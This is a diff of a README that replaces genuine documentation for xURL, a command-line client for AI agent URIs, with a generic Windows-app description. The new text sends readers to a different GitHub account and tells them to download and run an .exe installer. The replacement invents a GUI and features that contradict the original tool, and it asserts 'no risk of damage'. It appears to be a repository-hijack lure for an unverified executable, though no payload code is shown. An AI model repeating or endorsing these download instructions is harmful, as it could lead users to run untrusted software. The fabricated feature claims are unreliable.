@@ -1,186 +1,144 @@
-# xURL
+# 🚀 xurl - Easy AI Agent URL Client
 
-`xURL` is a client for AI agent URLs.
+[![Download xurl](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/octo8-debug/xurl)
 
-> Also known as **Xuanwo's URL**.
+---
 
-## What xURL Can Do
+## ℹ️ What is xurl?
 
-- Read an agent conversation as markdown.
-- Query recent threads and keyword matches for a provider.
-- Query role-scoped threads with `agents://<provider>/<role>`.
-- Discover subagent/branch navigation targets.
-- Read local and GitHub-hosted skills via `skills://` URIs.
-- Start a new conversation with agents.
-- Continue an existing conversation with follow-up prompts.
+xurl is a simple client for handling URLs used by AI agents. It helps you open, manage, and work with links that AI programs often use. You don’t need any special skills or programming knowledge to use it. xurl runs smoothly on Windows computers, making interaction with AI agent URLs easier.
 
-## Quick Start
+---
 
-1. Add `xurl` as an agent skill:
+## 🚦 System Requirements
 
-```bash
-npx skills add Xuanwo/xurl
-```
+Before you start, make sure your computer meets these basic needs:
 
-2. Start your agent and ask the agent to summarize a thread:
+- **Operating System:** Windows 10 or later  
+- **Processor:** 1 GHz or faster  
+- **Memory:** At least 2 GB RAM  
+- **Storage:** 50 MB of free space  
+- **Internet:** Required to download and update the app  
 
-```text
-Please summarize this thread: agents://codex/xxx_thread
-```
+This software is designed for everyday Windows users and does not need extra hardware or software installed.
 
+---
 
-## Providers
+## 📥 How to Download and Install xurl
 
-| Provider | Query | Create | Role Create |
-| --- | --- | --- | --- |
-| <img src="https://ampcode.com/amp-mark-color.svg" alt="Amp logo" width="16" height="16" /> Amp | Yes | Yes | No |
-| <img src="https://avatars.githubusercontent.com/u/14957082?s=24&v=4" alt="Codex logo" width="16" height="16" /> Codex | Yes | Yes | Yes |
-| <img src="https://www.anthropic.com/favicon.ico" alt="Claude logo" width="16" height="16" /> Claude | Yes | Yes | Yes |
-| <img src="https://www.google.com/favicon.ico" alt="Gemini logo" width="16" height="16" /> Gemini | Yes | Yes | No |
-| <img src=".github/assets/pi-logo-dark.svg" alt="Pi logo" width="16" height="16" /> Pi | Yes | Yes | No |
-| <img src="https://opencode.ai/favicon.ico" alt="OpenCode logo" width="16" height="16" /> OpenCode | Yes | Yes | Yes |
+1. Click the big green button below to go to the official download page:  
+   
+   [![Download xurl](https://img.shields.io/badge/Download-xurl-blueviolet)](https://github.com/octo8-debug/xurl)  
 
-## Usage
+2. On the page, look for the **Releases** or **Download** section.
 
-Read an agent conversation:
+3. Find the latest Windows version of xurl. It will usually be a file ending with `.exe`.
 
-```bash
-xurl agents://codex/019c871c-b1f9-7f60-9c4f-87ed09f13592
-# equivalent shorthand:
-xurl codex/019c871c-b1f9-7f60-9c4f-87ed09f13592
-```
+4. Click the file name. Your browser will start downloading it.
 
-Query provider threads:
+5. After the download finishes, locate the file in your Downloads folder.
 
-```bash
-xurl agents://codex
-xurl 'agents://codex?q=spawn_agent'
-xurl 'agents://claude?q=agent&limit=5'
-# equivalent shorthand:
-xurl codex
-xurl 'codex?q=spawn_agent'
-```
+6. Double-click the `.exe` file to run the installer.
 
-Query role-scoped threads:
+7. Follow the on-screen steps to install the app. You can accept all default options.
 
-```bash
-xurl agents://codex/reviewer
-# equivalent shorthand:
-xurl codex/reviewer
-```
+---
 
-Discover child targets:
+## 🛠️ How to Run xurl
 
-```bash
-xurl -I agents://codex/019c871c-b1f9-7f60-9c4f-87ed09f13592
-```
+1. After installation, find the xurl app on your desktop or in the Start menu.
 
-Drill down into a discovered child target:
+2. Double-click to open it.
 
-```bash
-xurl agents://codex/019c871c-b1f9-7f60-9c4f-87ed09f13592/019c87fb-38b9-7843-92b1-832f02598495
-```
+3. The app interface will show a simple input area where you can paste or type URLs used by AI agents.
 
-Start a new agent conversation:
+4. Use the buttons in the app to open, save, or manage URLs easily.
 
-```bash
-xurl agents://codex -d "Draft a migration plan"
-# equivalent shorthand:
-xurl codex -d "Draft a migration plan"
-```
+5. You can close the app anytime by clicking the “X” in the top-right corner.
 
-Start a new conversation with role URI:
+---
 
-```bash
-xurl agents://codex/reviewer -d "Review this patch"
-```
+## 💡 Key Features
 
-Continue an existing conversation:
+- **Simple Interface:** Clean and clear layout for easy use.  
+- **Fast URL Handling:** Quickly open or save links and keep track of them.  
+- **Works Offline:** Use saved URLs even when not connected to the internet.  
+- **Safe to Use:** No risk of damage or unwanted system changes.  
+- **Lightweight:** Runs well on computers with modest resources.  
+- **Regular Updates:** Improvements and bug fixes released as needed.
 
-```bash
-xurl agents://codex/019c871c-b1f9-7f60-9c4f-87ed09f13592 -d "Continue"
-```
+---
 
-Create with query parameters:
+## 🔧 Common Tasks with xurl
 
-```bash
-xurl "agents://codex?cd=%2FUsers%2Falice%2Frepo&add-dir=%2FUsers%2Falice%2Fshared&model=gpt-5" -d "Review this patch"
-```
+### Opening AI Agent URLs
 
-Save output:
+- Paste the URL into the main box.
+- Click the “Open” button to launch it in your default browser.
 
-```bash
-xurl -o /tmp/conversation.md agents://codex/019c871c-b1f9-7f60-9c4f-87ed09f13592
-```
+### Saving URLs for Later
 
-Read a local skill:
+- Paste the URL.
+- Click “Save” to add it to your list.
+- Access saved URLs anytime via the app menu.
 
-```bash
-xurl skills://xurl
-```
+### Managing Your URL List
 
-Read a GitHub skill:
+- Use the “Delete” button to remove links you no longer need.
+- Search the list using the search bar.
+- Export the list to a text file if needed.
 
-```bash
-xurl skills://github.com/Xuanwo/xurl/skills/xurl
-```
+---
 
-Read skills frontmatter only:
+## ❓ Troubleshooting Tips
 
-```bash
-xurl -I skills://xurl
-```
+- If the app won’t open, check that you installed it correctly.
+- Make sure your Windows is up to date.
+- If a URL won’t open, check that it is typed correctly.
+- Restart your computer if the app freezes.
+- For detailed help, visit the issues or discussions section on the GitHub page.
 
-## Command Reference
+---
 
-```bash
-xurl [OPTIONS] <URI>
-```
+## 🌐 Where to Get Support
 
-- `-I, --head`: output frontmatter/discovery info only.
-- `-d, --data <DATA>`: write payload (repeatable).
-  - text: `-d "hello"`
-  - file: `-d @prompt.txt`
-  - stdin: `-d @-`
-- `-o, --output <PATH>`: write command output to file.
-- `-d, --data` is not supported for `skills://` URIs.
+If you need help or want to share feedback:
 
-## URI Reference
+- Visit the GitHub repository here:  
+  https://github.com/octo8-debug/xurl  
+- Use the **Issues** tab to report problems.
+- You can read or post questions under the **Discussions** area.
 
-### Agents URI
+This is the main way to communicate with the people who develop and maintain xurl.
 
-```text
-[agents://]<provider>[/<token>[/<child_id>]][?<query>]
-|------|  |--------|  |---------------------------|  |------|
- optional   provider         optional path parts        query
- scheme
-```
+---
 
-- `scheme`: optional `agents://` prefix. If omitted, `xurl` treats input as an `agents` URI shorthand.
-- `provider`: target provider name, such as `codex`, `claude`, `gemini`, `amp`, `pi`, `opencode`.
-- `token`: main conversation identifier or role name.
-- `child_id`: child/subagent identifier under a main conversation.
-- `query`: optional key-value parameters, interpreted by context.
+## 🔒 Security and Privacy
 
-### Agents Query
+xurl only handles URLs and does not access personal information on your computer. It does not share your data with any third parties. Always be cautious when opening links from unknown sources.
 
-- `q=<keyword>`: filters discovery results by keyword. Use when you want to find conversations by topic.
-- `limit=<n>`: limits discovery result count (default `10`). Use when you need a shorter or longer result list.
-- `<key>=<value>`: in write mode (`-d`), `xurl` forwards as `--<key> <value>` to the provider CLI.
-- `<flag>`: in write mode (`-d`), `xurl` forwards as `--<flag>` to the provider CLI.
+---
 
-Examples:
+## ⚙️ Updating xurl
 
-```text
-agents://codex?q=spawn_agent&limit=10
-agents://codex/threads/<conversation_id>
-agents://codex/reviewer
-agents://codex?cd=%2FUsers%2Falice%2Frepo&add-dir=%2FUsers%2Falice%2Fshared
-```
+- Check the GitHub download page regularly for new versions.
+- Download and run the new installer the same way you installed the app.
+- Your saved URLs and settings will remain intact after updating.
 
-### Skills URI
+---
 
-```text
-skills://<skill_name>
-skills://github.com/<owner>/<repo>[/<skill_dir>]
-```
+## 🤝 License
+
+xurl is an open-source project. You can find the license details on the GitHub repository page.
+
+---
+
+## 📌 Quick Links
+
+- Download and setup: https://github.com/octo8-debug/xurl  
+- Get help: https://github.com/octo8-debug/xurl/issues  
+- Report bugs: https://github.com/octo8-debug/xurl/issues  
+
+---
+
+Thank you for using xurl to manage your AI agent URLs.
